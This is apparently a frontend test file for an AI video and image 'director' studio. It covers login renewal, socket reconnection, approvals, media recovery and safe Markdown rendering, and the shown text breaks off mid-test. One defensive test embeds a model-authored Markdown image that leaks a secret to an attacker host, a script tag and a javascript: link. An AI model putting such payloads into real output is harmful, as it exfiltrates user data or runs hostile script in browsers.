import { File as NodeFile } from 'node:buffer'
import { useState } from 'react'
import { act, fireEvent, render, screen, waitFor, within } from '@testing-library/react'
import { beforeEach, describe, expect, it, vi } from 'vitest'
import { http, HttpResponse } from 'msw'
import { server } from './mocks/server'
import { resetSharedSessionRefreshForTests } from '@/api/sessionRefresh'
import DeepAgentStudio from '@/components/director/DeepAgentStudio'
import CanvasDirectorDock from '@/components/director/CanvasDirectorDock'
import CanvasFloatingToolbar from '@/components/canvas/CanvasFloatingToolbar'
import DirectorStudioView from '@/views/DirectorStudioView'
import { DocumentEditor, Markdown, EventCard, Conversation, Approval } from '@/components/director/StudioCards'
import { Media, StudioMediaContext } from '@/components/director/StudioMedia'
import { applyStudioFrame, createStudioAPI, defaultModel, mediaURLs, contextInfo } from '@/components/director/studio'
import type { StudioRun, StudioDocument } from '@/components/director/studio'

const catalog = {
  models: [
    { id: 29, model: 'banana-pro', display_name: 'Nano Banana Pro (Google)', operation_codes: ['image.text_to_image'] },
    { id: 18, model: 'seedance-2.5', display_name: 'Seedance 2.5', operation_codes: ['video.generate'] },
  ],
  skills: [{ id: 1, name: 'director', description: '故事导演' }],
  planning_model: { id: 21, model: 'Qwen3.8-Max', operation_codes: [] },
}
function snapshot(overrides: Partial<StudioRun> = {}): StudioRun {
  return {
    id: 'run1',
    cursor: 7,
    status: 'complete',
    title: '第一集测试',
    events: [],
    selection: { image: 29, video: 18, mode: 'manual' },
    documents: [],
    batches: [],
    ...overrides,
  }
}
class Socket {
  static instances: Socket[] = []
  onopen?: () => void
  onmessage?: (event: { data: string }) => void
  onclose?: (event: { code: number }) => void
  close = vi.fn()
  constructor(public url: string) {
    Socket.instances.push(this)
  }
  emit(data: unknown) {
    this.onmessage?.({ data: JSON.stringify(data) })
  }
}
beforeEach(() => {
  sessionStorage.clear()
  resetSharedSessionRefreshForTests()
  Socket.instances = []
  vi.stubGlobal('WebSocket', Socket)
  HTMLDialogElement.prototype.showModal = function () {
    this.setAttribute('open', '')
  }
  HTMLDialogElement.prototype.close = function () {
    this.removeAttribute('open')
  }
  server.use(
    http.post('*/api/v1/auth/refresh', () => HttpResponse.json({ message: 'login required' }, { status: 401 })),
    http.get('*/agent-studio/', () => new HttpResponse('studio')),
    http.get('*/agent-studio/api/state', () =>
      HttpResponse.json({
        connected: true,
        session_scope: 'account-1',
        workspace_id: 54,
        runs: [{ id: 'run1', title: '第一集测试', status: 'complete' }],
      }),
    ),
    http.get('*/agent-studio/api/catalog', () => HttpResponse.json(catalog)),
    http.get('*/agent-studio/api/runs/run1', () => HttpResponse.json(snapshot())),
    http.get('*/agent-studio/api/runs/run1/media-retries', () => HttpResponse.json({ items: [], candidates: [] })),
  )
})
async function openHistory() {
  await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
  fireEvent.click(screen.getByRole('button', { name: '新对话' }))
  fireEvent.click(screen.getByRole('button', { name: /第一集测试/ }))
  await waitFor(() => expect(Socket.instances.length).toBe(1))
}

describe('Studio transport', () => {
  it('does not offer model switching for a context lookup failure without failed media', async () => {
    const queries = vi.fn()
    server.use(
      http.get('*/agent-studio/api/runs/run1', () => HttpResponse.json(snapshot({ status: 'error' }))),
      http.get('*/agent-studio/api/runs/run1/media-retries', () => {
        queries()
        return HttpResponse.json({ items: [], candidates: [] })
      }),
    )
    render(<DeepAgentStudio />)
    await openHistory()
    await waitFor(() => expect(queries).toHaveBeenCalledTimes(1))
    expect(screen.getByRole('button', { name: /恢复执行/ })).toBeVisible()
    expect(screen.queryByRole('button', { name: '查看失败原因与处理方案' })).not.toBeInTheDocument()
    expect(screen.getByText('执行已暂停，进度已保留。请查看上方的具体原因。')).toBeVisible()
  })

  it('offers media retry only when the server reports a failed media candidate', async () => {
    server.use(
      http.get('*/agent-studio/api/runs/run1', () => HttpResponse.json(snapshot({ status: 'error' }))),
      http.get('*/agent-studio/api/runs/run1/media-retries', () => HttpResponse.json({ items: [], candidates: [{ task_id: 7 }] })),
    )
    render(<DeepAgentStudio />)
    await openHistory()
    expect(await screen.findByRole('button', { name: '查看失败原因与处理方案' })).toBeVisible()
  })
  it('explains review rejection before retry and never posts when opening the batch failure', async () => {
    const posts = vi.fn()
    const candidate = { task_id: 7, title: 'Evening reference', tool: 'model.generate_image',
      before: { model_version_id: 29, prompt: 'Original fictional character', operation_code: 'image.text_to_image', params: {} },
      failure: { advice: { category: 'REVIEW_REJECTED', error_message: '安全审核拒绝' },
        explanation: '供应商未提供具体命中原因', actual_credits: 0,
        references: [{ asset_id: 8, origin: 'generated_in_session', title: 'Original portrait' }],
        assessment: { reason: '授权尚未明确', source_context_included: false } } }
    server.use(
      http.get('*/agent-studio/api/runs/run1', () => HttpResponse.json(snapshot({ status: 'error', active_batch: 'batch-1',
        batches: [{ id: 'batch-1', revision: 1, nodes: { a: { id: 'a', title: 'Evening reference', status: 'failed', attempt: 1, task_id: 7 } } }] }))),
      http.get('*/agent-studio/api/runs/run1/media-retries', () => HttpResponse.json({ items: [], candidates: [candidate] })),
      http.post('*/agent-studio/api/runs/run1/*', () => { posts(); return HttpResponse.json({}) }),
    )
    render(<DeepAgentStudio />)
    await openHistory()
    fireEvent.click(await screen.findByRole('button', { name: '查看原因与处理方案' }))
    expect(await screen.findByText('供应商未提供具体命中原因')).toBeVisible()
    expect(screen.getByText(/本会话生成 · Original portrait/)).toBeVisible()
    expect(screen.getByText(/这次判断未结合参考素材来源/)).toBeInTheDocument()
    expect(screen.getByRole('button', { name: '复制核查信息' })).toBeVisible()
    expect(screen.queryByRole('button', { name: '查看预计积分' })).not.toBeInTheDocument()
    expect(screen.queryByRole('textbox', { name: '提示词' })).not.toBeInTheDocument()
    expect(posts).not.toHaveBeenCalled()
  })

  it('keeps recovery usable when desktop notifications throw and never asks permission automatically', async () => {
    const notify = vi.fn(() => { throw new Error('desktop notifications unavailable') })
    const permission = vi.fn()
    class NotificationStub {
      static permission = 'granted'
      static requestPermission = permission
      constructor() { notify() }
    }
    const hidden = vi.spyOn(document, 'hidden', 'get').mockReturnValue(true)
    vi.stubGlobal('Notification', NotificationStub)
    server.use(http.get('*/agent-studio/api/runs/run1', () => HttpResponse.json(snapshot({ status: 'error' }))))
    try {
      render(<DeepAgentStudio />)
      await openHistory()
      expect(await screen.findByText('浏览器通知暂不可用，失败信息已保留在页面中')).toBeVisible()
      expect(screen.getByRole('button', { name: /恢复执行/ })).toBeVisible()
      expect(notify).toHaveBeenCalledTimes(1)
      expect(permission).not.toHaveBeenCalled()
    } finally {
      hidden.mockRestore()
      vi.unstubAllGlobals()
    }
  })
  it('canvas dock opens with business identity and collapse retains the draft without triggering canvas input', async () => {
    const canvasKey = vi.fn(),
      seen = vi.fn()
    server.use(
      http.get('*/agent-studio/api/state', ({ request }) => {
        seen(request.headers.get('X-Agent-Auth'), request.headers.get('X-Agent-Canvas-Id'))
        return HttpResponse.json({ connected: true, workspace_id: 54, runs: [] })
      }),
    )
    function CanvasHost() {
      const [opened, setOpened] = useState(false)
      return (
        <div onKeyDown={canvasKey}>
          <CanvasFloatingToolbar
            onAddNode={() => {}}
            onAddLocalImage={() => {}}
            panModeEnabled={false}
            onPanModeToggle={() => {}}
            dragEnabled
            onDragToggle={() => {}}
            onOpenSearch={() => {}}
            onOpenAssets={() => {}}
            onOpenHistory={() => {}}
            onOpenHelp={() => {}}
            directorOpen={opened}
            onToggleDirector={() => setOpened(!opened)}
          />
          <CanvasDirectorDock workspaceId={54} canvasId={40} opened={opened} onCollapse={() => setOpened(false)} />
        </div>
      )
    }
    render(<CanvasHost />)
    expect(seen).not.toHaveBeenCalled()
    expect(screen.getByRole('button', { name: '打开 DoDo Agent' }).closest('[data-canvas-floating-toolbar]')).toBeNull()
    fireEvent.click(screen.getByRole('button', { name: '打开 DoDo Agent' }))
    await screen.findByRole('button', { name: '发送创作要求' })
    expect(seen).toHaveBeenCalledWith('business', '40')
    const input = screen.getByRole('textbox')
    fireEvent.change(input, { target: { value: '保留草稿' } })
    fireEvent.keyDown(input, { key: 'Backspace' })
    expect(canvasKey).not.toHaveBeenCalled()
    fireEvent.click(
      within(screen.getByRole('region', { name: 'DoDo Agent' })).getByRole('button', { name: '收起 DoDo Agent' }),
    )
    fireEvent.click(screen.getByRole('button', { name: '打开 DoDo Agent' }))
    expect(screen.getByRole('textbox')).toHaveValue('保留草稿')
    expect(seen).toHaveBeenCalledTimes(1)
    expect(screen.getByRole('button', { name: '收起 DoDo Agent', expanded: true })).toHaveAttribute(
      'aria-expanded',
      'true',
    )
    fireEvent.click(screen.getByRole('button', { name: '收起 DoDo Agent', expanded: true }))
    expect(screen.queryByRole('textbox')).not.toBeInTheDocument()
    fireEvent.click(screen.getByRole('button', { name: '打开 DoDo Agent' }))
    expect(screen.getByRole('textbox')).toHaveValue('保留草稿')
  })

  it.each([65_000, 0])(
    'limits rapid auth reconnects but permits normal long-lived renewals (interval %d)',
    async (interval) => {
      render(<DeepAgentStudio workspaceId={54} canvasId={40} />)
      await openHistory()
      let now = Date.now()
      const clock = vi.spyOn(Date, 'now').mockImplementation(() => now)
      try {
        for (let index = 0; index < 4; index++) {
          now += interval
          act(() => Socket.instances.at(-1)!.emit({ event: 'stream_error', data: { code: 'AUTH_CHANGED' } }))
          if (interval || index < 3) {
            await waitFor(() => expect(Socket.instances).toHaveLength(index + 2))
          } else {
            await screen.findByText('登录状态持续变化，请重新检查业务登录。')
            expect(Socket.instances).toHaveLength(4)
          }
        }
      } finally {
        clock.mockRestore()
      }
    },
  )
  it.each(['send', 'upload'])(
    'renews an expired access token after a day before %s, submitting only once',
    async (action) => {
      const now = vi.spyOn(Date, 'now')
      let expires = 1_000 + 60 * 60 * 1000
      let refreshes = 0,
        writes = 0
      now.mockReturnValue(1_000)
      server.use(
        http.get('*/agent-studio/api/state', () =>
          Date.now() >= expires ? HttpResponse.json({}, { status: 401 }) : HttpResponse.json({ connected: true }),
        ),
        http.post('*/api/v1/auth/refresh', () => {
          refreshes++
          expires = Date.now() + 60 * 60 * 1000
          return HttpResponse.json({})
        }),
        http.post('*/agent-studio/api/runs', () => {
          writes++
          return Date.now() >= expires ? HttpResponse.json({}, { status: 401 }) : HttpResponse.json({ id: 'next' })
        }),
        http.post('*/agent-studio/api/attachments', () => {
          writes++
          return Date.now() >= expires ? HttpResponse.json({}, { status: 401 }) : HttpResponse.json({ id: 'file' })
        }),
      )
      try {
        const api = createStudioAPI('/agent-studio', { workspaceId: 54, canvasId: 40 })
        await api.request('/api/state')
        now.mockReturnValue(1_000 + 24 * 60 * 60 * 1000 - 1)
        if (action === 'send')
          await expect(api.request('/api/runs', { message: 'continue' })).resolves.toEqual({ id: 'next' })
        else await expect(api.upload(new File(['script'], 'script.txt'))).resolves.toMatchObject({ id: 'file' })
        expect([refreshes, writes]).toEqual([1, 1])
      } finally {
        now.mockRestore()
      }
    },
  )
  it('does not submit work when login renewal is revoked or unavailable', async () => {
    const writes = vi.fn()
    server.use(
      http.get('*/agent-studio/api/state', () => HttpResponse.json({}, { status: 401 })),
      http.post('*/agent-studio/api/runs', () => {
        writes()
        return HttpResponse.json({ id: 'unexpected' })
      }),
    )
    const api = createStudioAPI('/agent-studio', { workspaceId: 54, canvasId: 40 })
    await expect(api.request('/api/runs', { message: 'continue' })).rejects.toMatchObject({ status: 401 })
    expect(writes).not.toHaveBeenCalled()
  })
  it('renews business login and only replays safe reads, never generation', async () => {
    let reads = 0,
      writes = 0,
      refreshes = 0
    server.use(
      http.get('*/agent-studio/api/state', () =>
        ++reads === 1 ? HttpResponse.json({}, { status: 401 }) : HttpResponse.json({ connected: true }),
      ),
      http.post('*/api/v1/auth/refresh', () => {
        refreshes++
        return HttpResponse.json({})
      }),
      http.post('*/agent-studio/api/runs', () => {
        writes++
        return HttpResponse.json({}, { status: 401 })
      }),
    )
    const api = createStudioAPI('/agent-studio', { workspaceId: 54, canvasId: 40 })
    expect(await api.request('/api/state')).toEqual({ connected: true })
    await expect(api.request('/api/runs', { message: 'generate' })).rejects.toMatchObject({ status: 401 })
    expect([reads, writes, refreshes]).toEqual([3, 1, 1])
  })
  it('revalidates with current browser cookies and reconnects at the saved cursor after old handshake expires', async () => {
    render(<DeepAgentStudio workspaceId={54} canvasId={40} />)
    await openHistory()
    let reads = 0
    server.use(
      http.get('*/agent-studio/api/runs/run1', () => {
        reads++
        return HttpResponse.json(snapshot({ cursor: 12 }))
      }),
    )
    const old = Socket.instances[0]
    act(() => old.emit({ event: 'stream_error', data: { code: 'AUTH_CHANGED' } }))
    await waitFor(() => expect(Socket.instances).toHaveLength(2))
    expect(old.close).toHaveBeenCalled()
    expect(old.onclose).toBeNull()
    expect(reads).toBe(1)
    expect(new URL(Socket.instances[1].url).searchParams.get('after')).toBe('12')
  })
  it('stops on real logout, clears stale results and allows explicit recheck to restore the read stream', async () => {
    render(<DeepAgentStudio workspaceId={54} canvasId={40} />)
    await openHistory()
    let valid = false
    server.use(
      http.get('*/agent-studio/api/runs/run1', () =>
        valid ? HttpResponse.json(snapshot()) : HttpResponse.json({ detail: '业务登录已失效' }, { status: 401 }),
      ),
    )
    act(() => Socket.instances[0].onclose?.({ code: 1008 }))
    await screen.findByText('业务登录已失效')
    expect(Socket.instances).toHaveLength(1)
    expect(screen.getByRole('button', { name: '发送创作要求' })).toBeDisabled()
    valid = true
    fireEvent.click(screen.getByRole('button', { name: 'DoDo Agent 设置' }))
    fireEvent.click(screen.getByRole('button', { name: '重新检查业务登录' }))
    await waitFor(() => expect(Socket.instances).toHaveLength(2))
  })
  it('forwards business binding with cookies on reads, writes, uploads and websocket without tokens', async () => {
    const seen: Request[] = []
    server.use(
      http.get('*/agent-studio/api/state', ({ request }) => {
        seen.push(request)
        return HttpResponse.json({ connected: true })
      }),
      http.post('*/agent-studio/api/runs', ({ request }) => {
        seen.push(request)
        return HttpResponse.json({ id: 'new' })
      }),
      http.post('*/agent-studio/api/attachments', ({ request }) => {
        seen.push(request)
        return HttpResponse.json({ id: 'file' })
      }),
    )
    const api = createStudioAPI('/agent-studio', { workspaceId: 54, canvasId: 40 })
    await api.request('/api/state')
    await api.request('/api/runs', { message: 'test' })
    await api.upload(new File(['text'], 'script.txt'))
    expect(seen).toHaveLength(5)
    for (const request of seen) {
      expect(request.credentials).toBe('same-origin')
      expect(request.headers.get('X-Agent-Auth')).toBe('business')
      expect(request.headers.get('X-Agent-Workspace-Id')).toBe('54')
      expect(request.headers.get('X-Agent-Canvas-Id')).toBe('40')
      expect(request.headers.has('Authorization')).toBe(false)
    }
    const url = new URL(api.socketURL('run1', 7))
    expect(Object.fromEntries(url.searchParams)).toEqual({
      after: '7',
      auth: 'business',
      workspace_id: '54',
      canvas_id: '40',
    })
    expect(() => createStudioAPI('/agent-studio', { workspaceId: 54, canvasId: 0 })).toThrow()
  })
  it('embedded canvas uses business session without calling OAuth connect', async () => {
    const connect = vi.fn()
    server.use(
      http.post('*/agent-studio/api/connect', () => {
        connect()
        return HttpResponse.json({ url: 'https://oauth.example' })
      }),
    )
    render(<DeepAgentStudio workspaceId={54} canvasId={40} />)
    await screen.findByRole('button', { name: '发送创作要求' })
    fireEvent.click(screen.getByRole('button', { name: 'DoDo Agent 设置' }))
    expect(screen.queryByText('重新授权')).not.toBeInTheDocument()
    fireEvent.click(screen.getByRole('button', { name: '重新检查业务登录' }))
    await waitFor(() => expect(screen.getByRole('button', { name: '重新检查业务登录' })).not.toBeDisabled())
    expect(connect).not.toHaveBeenCalled()
  })
  it('expired business login never falls back to external OAuth or permits generation', async () => {
    server.use(
      http.get('*/agent-studio/api/state', () => HttpResponse.json({ detail: '请先登录业务系统' }, { status: 401 })),
    )
    render(<DeepAgentStudio workspaceId={54} canvasId={40} />)
    await screen.findByText('请先登录业务系统')
    expect(screen.getByRole('button', { name: '发送创作要求' })).toBeDisabled()
    fireEvent.click(screen.getByRole('button', { name: 'DoDo Agent 设置' }))
    expect(screen.queryByRole('button', { name: '登录并连接' })).not.toBeInTheDocument()
    expect(screen.getByRole('button', { name: '重新检查业务登录' })).toBeInTheDocument()
  })
  it('only accepts a same-origin mount and keeps cookie credentials out of socket URLs', () => {
    expect(() => createStudioAPI('https://other.test')).toThrow()
    expect(() => createStudioAPI('//other.test')).toThrow()
    const url = new URL(createStudioAPI().socketURL('a/b', 12))
    expect(url.pathname).toBe('/agent-studio/api/runs/a%2Fb/ws')
    expect(url.search).toBe('?after=12')
    expect(defaultModel(catalog, 'image')).toBe(29)
    expect(defaultModel(catalog, 'video')).toBe(18)
  })
  it('deduplicates replayed tasks and replaces billing snapshots', () => {
    let run = snapshot({ status: 'running', events: [{ id: 'task-1', kind: 'cost', text: 'running' }] })
    const event = {
      event: 'update',
      cursor: 8,
      data: {
        run_id: 'run1',
        type: 'TASK_UPDATED',
        data: { id: 'task-1', kind: 'cost', text: 'done', data: { status: 'succeeded', actual_cost: 4 } },
      },
    }
    run = applyStudioFrame(run, event)
    expect(run.events).toHaveLength(1)
    expect(run.events[0].text).toBe('done')
    expect(applyStudioFrame(run, event)).toBe(run)
    expect(applyStudioFrame(run, { ...event, cursor: 9, data: { ...event.data, run_id: 'other' } })).toBe(run)
    run = applyStudioFrame(run, {
      event: 'update',
      cursor: 10,
      data: { run_id: 'run1', type: 'ACTIVITY_SNAPSHOT', data: { settled_credits: '4.000' } },
    })
    run = applyStudioFrame(run, {
      event: 'update',
      cursor: 11,
      data: { run_id: 'run1', type: 'ACTIVITY_SNAPSHOT', data: { settled_credits: '5.000' } },
    })
    expect(run.billing?.settled_credits).toBe('5.000')
    expect(
      mediaURLs({
        assets: [{ download_url: 'javascript:alert(1)' }, { download_url: 'https://example.test/image.png' }],
      }),
    ).toEqual(['https://example.test/image.png'])
  })
  it('keeps events when RUN_STATE finishes and does not infer delivery success', () => {
    const run = snapshot({ status: 'running', events: [{ id: 'task', kind: 'cost', text: 'done' }] })
    const next = applyStudioFrame(run, {
      event: 'update',
      cursor: 8,
      data: { run_id: 'run1', type: 'RUN_STATE', data: { status: 'complete' } },
    })
    expect(next.events).toEqual(run.events)
    expect(next.status).toBe('complete')
    expect(next.canvas).toBeUndefined()
  })
})

describe('Director interactions', () => {
  it('uses the selected models and mode only after explicit send; unselected skill stays private', async () => {
    const starts: unknown[] = []
    server.use(
      http.post('*/agent-studio/api/runs', async ({ request }) => {
        expect(request.headers.get('X-Agent-Request')).toBe('1')
        starts.push(await request.json())
        return HttpResponse.json({ id: 'run1' })
      }),
    )
    render(<DeepAgentStudio />)
    await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
    expect(screen.queryByText(/内置 Skill|默认 Skill/)).not.toBeInTheDocument()
    fireEvent.click(screen.getByRole('button', { name: '手动确认' }))
    fireEvent.click(screen.getByRole('button', { name: /自动生成.*按你的要求/ }))
    expect(starts).toHaveLength(0)
    fireEvent.change(screen.getByRole('textbox', { name: '创作要求' }), { target: { value: '只制作第一集' } })
    fireEvent.click(screen.getByRole('button', { name: '发送创作要求' }))
    await waitFor(() => expect(starts).toHaveLength(1))
    expect(starts[0]).toMatchObject({
      message: '只制作第一集',
      selection: { image: 29, video: 18, mode: 'auto' },
      skill: '',
      attachments: [],
    })
  })
  it('shows structured approval and sends the exact decision ID, not a new run', async () => {
    const decisions: unknown[] = []
    server.use(
      http.get('*/agent-studio/api/runs/run1', () =>
        HttpResponse.json(
          snapshot({
            status: 'waiting',
            decision_id: 'approval-one',
            pending: {
              tool: 'production.generate_batch',
              message: '确认生成五张图，共 75 积分',
              arguments: { batch_id: 'batch-1' },
            },
          }),
        ),
      ),
      http.post('*/agent-studio/api/runs/run1/resume', async ({ request }) => {
        decisions.push(await request.json())
        return HttpResponse.json({ ok: true })
      }),
    )
    render(<DeepAgentStudio />)
    await openHistory()
    expect(screen.getByText('确认生成五张图，共 75 积分')).toBeInTheDocument()
    expect(decisions).toHaveLength(0)
    fireEvent.click(screen.getByRole('button', { name: '确认并继续' }))
    await waitFor(() => expect(decisions).toHaveLength(1))
    expect(decisions[0]).toEqual({
      decision_id: 'approval-one',
      decision: 'approve',
      message: '用户确认继续',
      arguments: { batch_id: 'batch-1' },
    })
  })
  it('updates Doudou from live task receipts and does not confuse UI errors with disconnection', async () => {
    server.use(http.get('*/agent-studio/api/runs/run1', () => HttpResponse.json(snapshot({ status: 'running' }))))
    render(<DeepAgentStudio />)
    await openHistory()
    const socket = Socket.instances[0]
    act(() => socket.onopen?.())
    expect(await screen.findByRole('img', { name: /豆豆正在思考/ })).toBeInTheDocument()
    expect(screen.getByText('正在思考')).toHaveAttribute('role', 'status')
    act(() =>
      socket.emit({
        event: 'update',
        cursor: 8,
        data: {
          run_id: 'run1',
          type: 'TASK_UPDATED',
          data: {
            id: 'image',
            kind: 'cost',
            text: '生成中',
            data: { task_id: 10, status: 'running', tool: 'model.generate_image' },
          },
        },
      }),
    )
    expect(screen.getByRole('img', { name: /豆豆正在制作素材/ })).toBeInTheDocument()
    expect(screen.queryByText('正在思考')).not.toBeInTheDocument()
    server.use(
      http.get('*/agent-studio/api/state', () => HttpResponse.json({ error: '历史读取失败' }, { status: 500 })),
    )
    fireEvent.click(screen.getByRole('button', { name: /第一集测试/ }))
    fireEvent.click(screen.getByRole('button', { name: '刷新历史' }))
    await screen.findByText('历史读取失败')
    expect(screen.getByRole('img', { name: /豆豆正在制作素材/ })).toBeInTheDocument()
    expect(screen.queryByText('正在思考')).not.toBeInTheDocument()
    act(() => socket.emit({ event: 'snapshot', cursor: 9, data: snapshot({ cursor: 9, status: 'waiting' }) }))
    expect(screen.getByRole('img', { name: /豆豆在等你确认/ })).toBeInTheDocument()
    act(() => socket.emit({ event: 'snapshot', cursor: 10, data: snapshot({ cursor: 10, status: 'complete' }) }))
    expect(screen.queryByRole('img', { name: /豆豆已完成本轮创作/ })).not.toBeInTheDocument()
    expect(screen.queryByText('本轮完成')).not.toBeVisible()
  })
  it('reconnect updates keep one task card and canvas callback; switching closes the socket', async () => {
    const onCanvasChange = vi.fn()
    render(<DeepAgentStudio onCanvasChange={onCanvasChange} />)
    await openHistory()
    const socket = Socket.instances[0]
    act(() => {
      const update = {
        event: 'update',
        cursor: 8,
        data: {
          run_id: 'run1',
          type: 'TASK_UPDATED',
          data: {
            id: 't1',
            kind: 'cost',
            text: '图片完成',
            data: { status: 'succeeded', tool: 'model.generate_image', actual_cost: 5 },
          },
        },
      }
      socket.emit(update)
      socket.emit(update)
      socket.emit({
        event: 'update',
        cursor: 9,
        data: {
          run_id: 'run1',
          type: 'CANVAS_UPDATED',
          data: {
            id: 'canvas-1',
            kind: 'canvas',
            text: '画布已同步',
            data: { canvas_id: 35, nodes: [{ id: 'node-1' }] },
          },
        },
      })
    })
    expect(screen.getAllByText('生成图片')).toHaveLength(1)
    expect(onCanvasChange).toHaveBeenCalledWith({ canvas_id: 35, nodes: [{ id: 'node-1' }] })
    fireEvent.click(screen.getByRole('button', { name: '新建会话' }))
    expect(socket.close).toHaveBeenCalled()
    act(() =>
      socket.emit({
        event: 'snapshot',
        cursor: 10,
        data: snapshot({ events: [{ id: 'late', kind: 'assistant', text: '旧会话迟到响应' }] }),
      }),
    )
    expect(screen.queryByText('旧会话迟到响应')).not.toBeInTheDocument()
  })
  it('blocks wrong-workspace writes before a canvas can be used', async () => {
    render(<DeepAgentStudio workspaceId={99} canvasId={35} />)
    await screen.findByText(/当前 MCP 授权空间与页面不同/)
    expect(screen.getByRole('button', { name: '发送创作要求' })).toBeDisabled()
  })
  it('explicit inference retry preserves task identity and successful results', async () => {
    const decisions: unknown[] = []
    server.use(
      http.get('*/agent-studio/api/runs/run1', () =>
        HttpResponse.json(
          snapshot({
            status: 'error',
            inference_failure: { task_id: 4362, retryable: true },
            events: [
              {
                id: 'good-image',
                kind: 'cost',
                text: '图片完成',
                data: { tool: 'model.generate_image', status: 'succeeded', actual_cost: 15 },
              },
            ],
          }),
        ),
      ),
      http.post('*/agent-studio/api/runs/run1/resume', async ({ request }) => {
        decisions.push(await request.json())
        return HttpResponse.json({ ok: true })
      }),
    )
    render(<DeepAgentStudio />)
    await openHistory()
    fireEvent.click(screen.getByRole('button', { name: /重试这次推理/ }))
    await waitFor(() => expect(decisions).toEqual([{ retry_inference_task_id: 4362 }]))
    expect(screen.getByText('生成图片')).toBeInTheDocument()
  })
})

describe('Studio concurrency and content boundaries', () => {
  it('partial state frames preserve recovery metadata and stale snapshots cannot rewind progress', () => {
    const run = snapshot({ active_batch: 'batch-7', inference_failure: { task_id: 4362, retryable: true } })
    const next = applyStudioFrame(run, {
      event: 'update',
      cursor: 9,
      data: { run_id: 'run1', type: 'RUN_STATE', data: { status: 'paused', stop: true, pending: null } },
    })
    expect(next.active_batch).toBe('batch-7')
    expect(next.inference_failure?.task_id).toBe(4362)
    expect(next.status).toBe('paused')
    expect(applyStudioFrame(next, { event: 'snapshot', cursor: 8, data: snapshot({ status: 'running' }) })).toBe(next)
  })
  it('saves the editing-base revision after a concurrent document update, retaining the draft', async () => {
    const save = vi.fn(async (_doc: StudioDocument, _body: string, _key: string) => {})
    const original = { id: 'doc1', title: '分镜', kind: 'storyboard', revision: 1, body: '原始正文' }
    const view = render(<DocumentEditor document={original} busy={false} onSave={save} />)
    fireEvent.click(screen.getByRole('button', { name: '编辑文档' }))
    fireEvent.change(screen.getByRole('textbox', { name: '制作文档正文' }), { target: { value: '我的未保存改动' } })
    view.rerender(
      <DocumentEditor
        document={{ ...original, revision: 2, body: '另一位操作者的新正文' }}
        busy={false}
        onSave={save}
      />,
    )
    expect(screen.getByRole('textbox', { name: '制作文档正文' })).toHaveValue('我的未保存改动')
    expect(screen.getByRole('status')).toHaveTextContent('当前草稿仍基于版本 1')
    fireEvent.click(screen.getByRole('button', { name: '保存修订' }))
    await waitFor(() => expect(save).toHaveBeenCalledTimes(1))
    expect(save.mock.calls[0][0]).toMatchObject({ id: 'doc1', revision: 1 })
    expect(save.mock.calls[0][1]).toBe('我的未保存改动')
  })
  it('does not execute model HTML or automatically fetch model-authored Markdown images', () => {
    const view = render(
      <Markdown>
        {'![private](https://attacker.test/leak?secret=x) <script>alert(1)</script> [bad](javascript:alert(1))'}
      </Markdown>,
    )
    expect(view.container.querySelector('img,script,iframe')).toBeNull()
    expect(view.container.querySelector('a')?.getAttribute('href') || '').not.toMatch(/^javascript:/)
    expect(view.container).toHaveTextContent('private')
  })
  it('allows stopping while an earlier resume HTTP request is still outstanding', async () => {
    let release: () => void = () => {}
    const pending = new Promise<void>((resolve) => {
      release = resolve
    })
    const resumes: unknown[] = [],
      stops: unknown[] = []
    server.use(
      http.get('*/agent-studio/api/runs/run1', () => HttpResponse.json(snapshot({ status: 'error' }))),
      http.post('*/agent-studio/api/runs/run1/resume', async ({ request }) => {
        resumes.push(await request.json())
        await pending
        return HttpResponse.json({ ok: true })
      }),
      http.post('*/agent-studio/api/runs/run1/stop', async ({ request }) => {
        stops.push(await request.json())
        return HttpResponse.json({ ok: true })
      }),
    )
    render(<DeepAgentStudio />)
    await openHistory()
    fireEvent.click(screen.getByRole('button', { name: '恢复执行 / 查询已有任务' }))
    await waitFor(() => expect(resumes).toHaveLength(1))
    act(() =>
      Socket.instances[0].emit({
        event: 'update',
        cursor: 8,
        data: { run_id: 'run1', type: 'RUN_STATE', data: { status: 'running', stop: false } },
      }),
    )
    const stop = screen.getByRole('button', { name: '停止回复' })
    expect(stop.closest('form')).not.toBeNull()
    expect(stop).not.toBeDisabled()
    fireEvent.click(stop)
    await waitFor(() => expect(stops).toEqual([{}]))
    release()
  })
})

describe('Media and activity recovery', () => {
  it('uses refreshed canvas URLs and never leaves a stateless progress note spinning', () => {
    expect(
      mediaURLs(
        { assets: [{ id: 12, download_url: 'https://media.test/old.png' }] },
        { nodes: [{ asset_id: 12, url: 'https://media.test/fresh.png' }] },
      ),
    ).toEqual(['https://media.test/fresh.png'])
    render(<EventCard event={{ id: 'notice', kind: 'progress', text: '参考素材已通过审核' }} />)
    expect(screen.getByText('参考素材已通过审核')).toBeInTheDocument()
    expect(screen.queryByText('处理中')).not.toBeInTheDocument()
  })
  it('refreshes an expired asset once automatically and permits an explicit read-only refresh', async () => {
    const refresh = vi.fn(async (_id: number) => ({ id: 12, download_url: 'https://media.test/fresh.png' }))
    render(
      <StudioMediaContext.Provider value={{ refresh }}>
        <Media data={{ assets: [{ id: 12, download_url: 'https://media.test/old.png' }] }} />
      </StudioMediaContext.Provider>,
    )
    fireEvent.error(screen.getByRole('img', { name: '生成素材' }))
    await waitFor(() =>
      expect(screen.getByRole('img', { name: '生成素材' })).toHaveAttribute('src', 'https://media.test/fresh.png'),
    )
    expect(refresh).toHaveBeenCalledWith(12)
    fireEvent.error(screen.getByRole('img', { name: '生成素材' }))
    expect(refresh).toHaveBeenCalledTimes(1)
    fireEvent.click(screen.getByRole('button', { name: '刷新素材链接' }))
    await waitFor(() => expect(refresh).toHaveBeenCalledTimes(2))
  })
})

describe('Director conversation parity', () => {
  it('opens real document previews from the conversation and offers the current Markdown download', async () => {
    const doc = { id: 'board', title: '第一集分镜', kind: 'storyboard', revision: 4, body: '# 分镜正文\n真实制作资料' }
    server.use(
      http.get('*/agent-studio/api/runs/run1', () =>
        HttpResponse.json(
          snapshot({
            documents: [doc],
            events: [{ id: 'document-board', kind: 'document', text: '已保存', data: doc }],
          }),
        ),
      ),
    )
    render(<DeepAgentStudio />)
    await openHistory()
    fireEvent.click(screen.getByRole('button', { name: /第一集分镜.*制作文档/ }))
    expect(await screen.findByRole('heading', { name: '分镜正文' })).toBeInTheDocument()
    expect(screen.getByRole('link', { name: '下载文档' })).toHaveAttribute('download', '第一集分镜.md')
    expect(decodeURIComponent(screen.getByRole('link', { name: '下载文档' }).getAttribute('href') || '')).toContain(
